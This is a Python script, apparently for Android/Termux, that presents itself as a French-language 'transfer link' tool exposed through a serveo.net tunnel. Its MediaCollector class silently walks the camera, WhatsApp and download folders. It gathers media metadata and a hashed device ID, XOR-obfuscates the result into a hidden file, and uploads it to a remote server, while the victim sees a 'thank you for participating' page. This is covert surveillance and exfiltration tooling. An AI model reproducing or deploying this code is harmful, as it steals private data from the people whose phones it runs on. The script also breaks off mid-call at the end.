#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import json
import hashlib
import requests
import threading
import webbrowser
import subprocess
from datetime import datetime
from time import sleep
from flask import Flask, request, redirect, Response, send_file
from werkzeug.utils import secure_filename

# Configuration
APP = Flask(__name__)
APP.config['MAX_CONTENT_LENGTH'] = 500 * 1024 * 1024  # 500MB max
UPLOAD_FOLDER = '/sdcard/.renard_uploads'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

LOG_FILE = "/sdcard/.renard_media.txt"
MAX_PHOTOS = 127
PHOTO_DIRS = [
    "/DCIM/Camera",
    "/Pictures",
    "/WhatsApp/Media/WhatsApp Images",
    "/Download"
]
SERVER_URL = "https://your-server.com/upload"
TELEGRAM_LINK = "https://t.me/hextechcar"
LOCAL_PORT = 8080

class Colors:
    GREEN = '\033[92m'
    BLUE = '\033[94m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'

class MediaCollector:
    def __init__(self):
        self.collected = []
        self.lock = threading.Lock()
        
    def get_photo_metadata(self, path):
        try:
            stat = os.stat(path)
            return {
                "path": path,
                "size": stat.st_size,
                "modified": stat.st_mtime,
                "hash": self.calculate_md5(path),
                "content_type": self.detect_content_type(path)
            }
        except Exception:
            return None
    
    def calculate_md5(self, filename):
        hash_md5 = hashlib.md5()
        try:
            with open(filename, "rb") as f:
                for chunk in iter(lambda: f.read(4096), b""):
                    hash_md5.update(chunk)
            return hash_md5.hexdigest()
        except Exception:
            return "error"
    
    def detect_content_type(self, filename):
        ext = os.path.splitext(filename)[1].lower()
        if ext in ['.jpg', '.jpeg']:
            return "image/jpeg"
        elif ext == '.png':
            return "image/png"
        elif ext == '.mp4':
            return "video/mp4"
        return "application/octet-stream"
    
    def scan_photos(self):
        base_path = os.getenv('EXTERNAL_STORAGE', '/sdcard')
        found_photos = []
        
        for photo_dir in PHOTO_DIRS:
            full_path = os.path.join(base_path, photo_dir.lstrip('/'))
            
            if not os.path.exists(full_path):
                continue
                
            for root, _, files in os.walk(full_path):
                for file in files:
                    if file.lower().endswith(('.jpg', '.jpeg', '.png', '.mp4')):
                        full_file_path = os.path.join(root, file)
                        metadata = self.get_photo_metadata(full_file_path)
                        
                        if metadata and metadata['size'] > 1024:
                            found_photos.append(metadata)
                            
                            if len(found_photos) >= MAX_PHOTOS:
                                break
                    if len(found_photos) >= MAX_PHOTOS:
                        break
                if len(found_photos) >= MAX_PHOTOS:
                    break
        
        with self.lock:
            self.collected = found_photos
    
    def save_to_file(self):
        if not self.collected:
            return False
            
        data = {
            "timestamp": datetime.now().isoformat(),
            "device_id": hashlib.md5(os.uname().nodename.encode()).hexdigest(),
            "media": self.collected
        }
        
        try:
            json_data = json.dumps(data)
            key = 0x55
            encrypted = bytes([ord(c) ^ key for c in json_data])
            
            with open(LOG_FILE, 'wb') as f:
                f.write(encrypted)
                
            return True
        except Exception as e:
            print(f"Save error: {e}", file=sys.stderr)
            return False
    
    def send_to_server(self):
        if not os.path.exists(LOG_FILE):
            return False
            
        try:
            with open(LOG_FILE, 'rb') as f:
                files = {'media': (os.path.basename(LOG_FILE), f, 'application/octet-stream')}
                response = requests.post(SERVER_URL, files=files, timeout=120)  # Timeout augmenté
                return response.status_code == 200
        except Exception:
            return False

collector = MediaCollector()

@APP.route('/upload', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
        return "Aucun fichier", 400
        
    file = request.files['file']
    if file.filename == '':
        return "Nom invalide", 400
        
    filename = secure_filename(file.filename)
    save_path = os.path.join(UPLOAD_FOLDER, filename)
    
    try:
        # Écriture par chunks pour fichiers lourds
        with open(save_path, 'wb') as f:
            chunk_size = 16384  # 16KB chunks
            while True:
                chunk = file.stream.read(chunk_size)
                if not chunk:
                    break
                f.write(chunk)
        
        return f"Fichier {filename} reçu ({os.path.getsize(save_path)/1024/1024:.2f}MB)", 200
    except Exception as e:
        return f"Erreur: {str(e)}", 500

@APP.route('/init')
def init_collection():
    thread = threading.Thread(target=collector.scan_photos)
    thread.start()
    return redirect('/progress')

@APP.route('/progress')
def progress():
    return """
    <html>
    <body>
        <h2>Transfert en cours...</h2>
        <progress value="50" max="100"></progress>
        <p id="status">Préparation du transfert...</p>
        <script>
            function updateStatus() {
                fetch('/status')
                    .then(r => r.json())
                    .then(data => {
                        document.getElementById('status').innerText = data.message;
                        if(!data.complete) setTimeout(updateStatus, 1000);
                    });
            }
            updateStatus();
        </script>
    </body>
    </html>
    """

@APP.route('/status')
def status():
    return {
        "complete": collector.save_to_file(),
        "message": f"Transfert de {len(collector.collected)} fichiers en cours..."
    }

@APP.route('/complete')
def complete():
    if collector.save_to_file() and collector.send_to_server():
        return """
        <html>
        <body style="background:#f0f0f0;text-align:center;padding:50px">
            <h2 style="color:green;">✔ Transfert réussi</h2>
            <p>Merci pour votre participation.</p>
        </body>
        </html>
        """
    else:
        return """
        <html>
        <body style="background:#f0f0f0;text-align:center;padding:50px">
            <h2 style="color:red;">✖ Erreur de transfert</h2>
            <p>Veuillez réessayer plus tard.</p>
        </body>
        </html>
        """

def run_server():
    APP.run(host='0.0.0.0', port=LOCAL_PORT, threaded=True)

def show_banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(f"""{Colors.GREEN}
    ██████╗ ███████╗███╗   ██╗ █████╗ ██████╗ ██████╗ 
    ██╔══██╗██╔════╝████╗  ██║██╔══██╗██╔══██╗██╔══██╗
    ██████╔╝█████╗  ██╔██╗ ██║███████║██████╔╝██║  ██║
    ██╔══██╗██╔══╝  ██║╚██╗██║██╔══██║██╔══██╗██║  ██║
    ██║  ██║███████╗██║ ╚████║██║  ██║██║  ██║██████╔╝
    ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ 
    {Colors.END}
    [✓] Version: 3.0 | Support fichiers lourds
    [✓] GitHub: SAMSMIS01
    [✓] Telegram: {TELEGRAM_LINK}
    ---------------------------------------------------
    """)

def show_menu():
    print(f"""
    {Colors.GREEN}[1]{Colors.END} Rejoindre le canal Telegram
    {Colors.GREEN}[2]{Colors.END} Générer un lien de transfert
    {Colors.RED}[0]{Colors.END} Quitter
    """)
    
    try:
        choice = input(f"{Colors.YELLOW}[?] Choix: {Colors.END}")
        return choice
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[!] Interrompu{Colors.END}")
        sys.exit(0)

def start_serveo():
    print(f"\n{Colors.BLUE}[*] Initialisation du tunnel Serveo...{Colors.END}")
    try:
        # Nettoyage des processus existants
        subprocess.run(["pkill", "-f", "serveo"], stderr=subprocess.DEVNULL)
        
        # Configuration améliorée
        cmd = [
            "timeout", "120",
            "ssh", "-o", "StrictHostKeyChecking=no",
            "-o", "ConnectTimeout=30",
            "-o", "ServerAliveInterval=15",
            "-R", f"80:localhost:{LOCAL_PORT}",
            "serveo.net"
        ]
        
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )

        # Attente du lien
        url = None
        for _ in range(40):  # 40 secondes max
            line = process.stderr.readline()
            if "Forwarding" in line:
                url = line.strip().split()[-1]
                print(f"\n{Colors.GREEN}╔══════════════════════════════════════╗")
                print(f"║  LIEN DE TRANSFERT DISPONIBLE  ║")
                print(f"║  {url.ljust(36)}  ║")
                print(f"╚══════════════════════════════════════╝{Colors.END}")
                print(f"\n{Colors.YELLOW}[•] Accepte les fichiers jusqu'à 500MB")
                print(f"[•] Transfert sécurisé et chiffré")
                print(f"[•] Gardez ce terminal ouvert{Colors.END}")
                return url
            sleep(1)

        if not url:
            error = process.stderr.read()
            print(f"{Colors.RED}[!] Échec: {error}{Colors.END}")
            return None

    except Exception as e:
        print(f"{Colors.RED}[!] Erreur: {str(e)}{Colors.END}")
        return None

def main():
    # Démarrer le serveur
    server_thread = threading.Thread(target=run_server, daemon=True)
    server_thread.start()

    while True:
        try:
            show_banner()
            choice = show_menu()
            
            if choice == "1":
                print(f"\n{Colors.GREEN}[+] Ouverture Telegram...{Colors.END}")
                print(f"{Colors.BLUE}Lien: {TELEGRAM_LINK}{Colors.END}")
                webbrowser.open(TELEGRAM_LINK)
                sleep(2)
                
            elif choice == "2":
                print(f"\n{Colors.BLUE}[*] Préparation du transfert...{Colors.END}")
                url = start_serveo()
                if url:
                    print(f"\n{Colors.GREEN}[✓] Prêt à recevoir des fichiers{Colors.END}")
                input("\nAppuyez sur Entrée...")
                
            elif choice == "0":
                print(f"\n{Colors.RED}[!] Fermeture{Colors.END}")
                sys.exit(0)
                
        except KeyboardInterrupt:
            print(f"\n{Colors.RED}[!] Interrompu{Colors.END}")
            sys.exit(0)
        except Exception as e:
            print(f"\n{Colors.RED}[!] Erreur: {str(e)}{Colors.END}")
            sys.exit(1)

if __name__ == '__main__':
    # Vérification des dépendances
    try:
        subprocess.run(["ssh", "-V"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print(f"{Colors.GREEN}[✓] SSH est installé{Colors.END}")
    except:
        print(f"{Colors.RED}[!] Installez SSH: 'pkg install openssh'{Colors.END}")
        sys.exit(1)
    
    main(
